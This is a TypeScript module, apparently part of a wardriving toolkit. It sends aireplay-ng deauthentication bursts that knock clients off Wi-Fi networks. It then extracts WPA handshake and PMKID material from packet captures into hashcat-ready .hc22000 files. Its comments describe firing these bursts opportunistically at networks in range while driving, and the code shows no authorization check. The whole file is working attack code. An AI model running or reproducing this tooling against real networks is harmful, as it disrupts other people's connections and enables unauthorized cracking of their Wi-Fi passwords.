import { spawn, execFile, ChildProcess } from "child_process";
import { promisify } from "util";
import fs from "fs";
import path from "path";
import { ringFiles } from "./capture";

const execFileAsync = promisify(execFile);

// Opportunistic capture + deauth runners for the wardrive module (driving capture).
//
// extractCapture() is the ONLY way an EAPOL sighting becomes an artifact:
// hcxpcapngtool runs over the session's ringbuffer pcaps (which hold real
// 802.11 traffic including EAPOL), copies the winning .cap into the session
// dir and reports whether an actual EAPOL/PMKID pair was present. A "hit"
// without EAPOL material never marks the network captured.
//
// DeauthOpRunner sends ONE directed (or broadcast when client=null)
// aireplay-ng burst and exits — same killable-process-group pattern as
// wifi-audit/attack.ts. Short bursts only: the wardrive policy re-fires them
// from service.ts while the target stays in range, never an unbounded run.

const BURST_DEFAULT = 16; // small burst per round; rounds repeat while in range

export async function extractEapolToSession(
  bssid: string,
  ringDir: string,
  sessionDir: string,
): Promise<{ ok: boolean; capFile: string; hashFile: string; eapolPairs: number }> {
  const prefix = bssid.replace(/:/g, "").toLowerCase();
  const destCap = path.join(sessionDir, `${prefix}.cap`);
  const destHash = path.join(sessionDir, `${prefix}.hc22000`);
  const tmpHash = `${destHash}.tmp`;
  const files = ringFiles(ringDir);
  let best = 0;
  let bestSrc: string | null = null;
  for (const f of files.reverse()) {
    // Newest first: the burst we just fired is in the freshest file.
    try {
      const { stdout, stderr } = await execFileAsync("hcxpcapngtool", ["-o", tmpHash, f], {
        timeout: 30_000,
      });
      const text = `${stdout}\n${stderr}`;
      const eapolMatch = /EAPOL pairs written to .+?:\s*(\d+)/i.exec(text);
      const written = eapolMatch ? parseInt(eapolMatch[1], 10) : 0;
      if (written > best) {
        best = written;
        bestSrc = f;
      }
    } catch {
      // Ring file may have rotated away mid-run — try the next one.
    }
  }
  try {
    fs.unlinkSync(tmpHash);
  } catch {
    // nothing written
  }
  if (best === 0 || !bestSrc) return { ok: false, capFile: "", hashFile: "", eapolPairs: 0 };
  try {
    fs.copyFileSync(bestSrc, destCap);
    const { stdout, stderr } = await execFileAsync("hcxpcapngtool", ["-o", destHash, bestSrc], {
      timeout: 30_000,
    });
    const text = `${stdout}\n${stderr}`;
    const eapolMatch = /EAPOL pairs written to .+?:\s*(\d+)/i.exec(text);
    const written = eapolMatch ? parseInt(eapolMatch[1], 10) : 0;
    const hashOk = written > 0 && fs.existsSync(destHash) && fs.statSync(destHash).size > 0;
    return {
      ok: hashOk,
      capFile: hashOk ? path.basename(destCap) : "",
      hashFile: hashOk ? path.basename(destHash) : "",
      eapolPairs: written,
    };
  } catch {
    return { ok: false, capFile: "", hashFile: "", eapolPairs: 0 };
  }
}

export class DeauthOpRunner {
  private proc: import("child_process").ChildProcess | null = null;
  private running = false;

  constructor(
    private iface: string,
    private bssid: string,
    private clientMac: string | null,
    private count: number = BURST_DEFAULT,
  ) {}

  start(): void {
    if (this.running) return;
    this.running = true;
    const args = ["sudo", "-n", "aireplay-ng", "--deauth", String(this.count), "-a", this.bssid];
    if (this.clientMac) args.push("-c", this.clientMac);
    args.push("-D", this.iface);
    this.proc = spawnDetached(args);
  }

  stop(): void {
    this.running = false;
    killGroup(this.proc);
    this.proc = null;
  }

  isRunning(): boolean {
    return this.running;
  }
}

// Minimal detached spawn + group kill (full versions in wardrive/attack.ts
// and wifiradar/capture.ts carry more guards; this one covers the same ESRCH
// races those comments document).
function spawnDetached(args: string[]): ChildProcess {
  return spawn(args[0], args.slice(1), { detached: true, stdio: ["ignore", "ignore", "ignore"] });
}

function killGroup(proc: ChildProcess | null): void {
  if (!proc?.pid) return;
  try {
    process.kill(-proc.pid, "SIGTERM");
  } catch {
    try {
      proc.kill("SIGTERM");
    } catch {
      // Already gone.
    }
  }
}